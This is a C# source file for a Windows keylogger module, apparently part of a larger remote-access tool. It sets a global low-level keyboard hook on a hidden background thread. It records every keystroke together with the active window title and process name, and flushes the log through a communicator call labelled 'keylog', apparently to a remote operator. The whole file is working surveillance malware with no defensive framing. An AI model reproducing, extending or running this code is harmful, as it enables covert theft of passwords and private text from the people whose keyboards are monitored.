using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using True.Core;
using System.Windows.Forms; // for Keys

namespace True.Features
{
    public static class Keylogger
    {
        private static IntPtr hookID = IntPtr.Zero;
        private static StringBuilder buffer = new StringBuilder();
        private static readonly object bufferLock = new object();
        private static int bufferLimit = 300; // increased
        private static System.Timers.Timer flushTimer;
        private static string lastWindow = "";
        private static string lastProcess = "";
        private static LowLevelKeyboardProc proc = HookCallback;

        public static void Start()
        {
            // Setup flush timer: flush after 5 seconds idle
            flushTimer = new System.Timers.Timer(5000);
            flushTimer.AutoReset = false;
            flushTimer.Elapsed += (s, e) =>
            {
                lock (bufferLock)
                {
                    FlushBuffer();
                }
            };

            new Thread(() =>
            {
                try
                {
                    hookID = SetHook(proc);
                    Logger.Info("Keylogger", "Keyboard hook set.");
                    AppDomain.CurrentDomain.ProcessExit += (s, e) => Stop();
                    Application.Run();
                }
                catch (Exception ex)
                {
                    Logger.Error("Keylogger", $"Exception in Start: {ex.Message}");
                }
            })
            {
                IsBackground = true
            }.Start();
        }

        public static void Stop()
        {
            try
            {
                lock (bufferLock)
                {
                    FlushBuffer();
                }

                if (hookID != IntPtr.Zero)
                {
                    UnhookWindowsHookEx(hookID);
                    hookID = IntPtr.Zero;
                    Logger.Info("Keylogger", "Keyboard hook removed.");
                }
            }
            catch (Exception ex)
            {
                Logger.Error("Keylogger", $"Exception in Stop: {ex.Message}");
            }
        }

        private static void FlushBuffer()
        {
            if (buffer.Length > 0)
            {
                try
                {
                    Communicator.PostResponse("keylog", buffer.ToString());
                    buffer.Clear();
                }
                catch (Exception ex)
                {
                    Logger.Error("Keylogger", $"FlushBuffer Exception: {ex.Message}");
                }
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            try
            {
                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                {
                    int vkCode = Marshal.ReadInt32(lParam);
                    Keys key = (Keys)vkCode;
                    string keyString = ConvertKey(key);

                    string activeWindow = GetActiveWindowTitle();
                    string activeProcess = GetActiveProcessName();

                    lock (bufferLock)
                    {
                        // Add header only if window or process changed
                        if (buffer.Length == 0 || activeWindow != lastWindow || activeProcess != lastProcess)
                        {
                            buffer.AppendLine($"\n--- {DateTime.Now} ---");
                            buffer.AppendLine($"[{activeProcess}] - {activeWindow}");
                            lastWindow = activeWindow;
                            lastProcess = activeProcess;
                        }

                        buffer.Append(keyString);

                        // Reset the timer on every keypress
                        flushTimer.Stop();
                        flushTimer.Start();

                        if (buffer.Length >= bufferLimit)
                        {
                            FlushBuffer();
                            flushTimer.Stop(); // Stop timer since buffer flushed
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.Error("Keylogger", $"Exception in HookCallback: {ex.Message}");
            }

            return CallNextHookEx(hookID, nCode, wParam, lParam);
        }

        private static string ConvertKey(Keys key)
        {
            switch (key)
            {
                case Keys.Space: return " ";
                case Keys.Enter: return "[ENTER]\n";
                case Keys.Back: return "[BACK]";
                case Keys.Tab: return "[TAB]";
                case Keys.Escape: return "[ESC]";
                case Keys.LControlKey:
                case Keys.RControlKey: return "[CTRL]";
                case Keys.LShiftKey:
                case Keys.RShiftKey: return "[SHIFT]";
                case Keys.LWin:
                case Keys.RWin: return "[WIN]";
                default:
                    // Return single character keys as is, others as [KEY]
                    string s = key.ToString();
                    return s.Length == 1 ? s : $"[{s}]";
            }
        }

        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder buff = new StringBuilder(nChars);

            IntPtr handle = GetForegroundWindow();

            if (handle == IntPtr.Zero)
                return "Unknown Window";

            if (GetWindowText(handle, buff, nChars) > 0)
                return buff.ToString();

            return "Unknown Window";
        }

        private static string GetActiveProcessName()
        {
            try
            {
                IntPtr hwnd = GetForegroundWindow();
                if (hwnd == IntPtr.Zero)
                    return "Unknown Process";

                uint pid;
                GetWindowThreadProcessId(hwnd, out pid);

                Process proc = Process.GetProcessById((int)pid);
                return proc.ProcessName;
            }
            catch
            {
                return "Unknown Process";
            }
        }

        #region WinAPI

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern int GetWindowText(IntPtr hwnd, StringBuilder lpString, int cch);

        [DllImport("user32.dll")]
        private static extern uint GetWindowThreadProcessId(IntPtr hwnd, out uint lpdwProcessId);

        #endregion
    }
}
